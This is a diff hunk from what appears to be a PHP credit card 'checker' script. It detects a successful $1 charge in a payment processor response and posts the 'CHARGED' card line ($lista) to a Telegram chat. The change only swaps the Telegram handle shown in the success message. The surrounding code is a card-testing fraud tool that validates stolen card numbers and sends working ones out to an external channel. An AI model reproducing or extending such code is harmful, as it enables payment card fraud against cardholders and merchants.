@@ -182,7 +182,7 @@ $risklevel = trim(strip_tags(getStr($r2, '"risk_level": "', '"')));
 if ((strpos($r2, '"status": "succeeded"')) || (strpos($r2, '"seller_message": "Payment complete."'))){
   sendMessage('-1001837568442',urlencode("
 CHARGED : <code> $lista </code>
-𝘾𝘾𝙉 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 $1 @Itsz_Krish_Babess ✅
+𝘾𝘾𝙉 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 $1 @Sabka_Papa_Electra0p ✅
  "),$messageId);
   $c--;
   continue;
